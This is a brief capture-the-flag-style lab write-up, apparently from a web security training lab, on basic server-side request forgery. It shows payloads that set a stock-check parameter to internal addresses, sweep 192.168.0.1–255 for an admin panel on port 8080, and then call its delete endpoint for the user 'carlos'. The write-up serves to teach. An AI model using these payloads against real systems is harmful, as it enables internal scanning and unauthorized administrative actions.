# Basic SSRF against another back-end system

## This lab has a stock check feature which fetches data from an internal system.

## To solve the lab, use the stock check functionality to scan the internal `192.168.0.X` range for an admin interface on port 8080, then use it to delete the user `carlos`.

---

### step 1

intercept the check functionality
send to intruder

## stockApi=http://192.168.0.§1§:8080/admin

set payload number
add range 1 to 255
and steps 1

## stockApi=http://192.168.0.230:8080/admin

at 230 it successful to get admin panel

### step2

again intercept heck functionality

## stockApi=http://192.168.0.230:8080/admin/delete?username=carlos
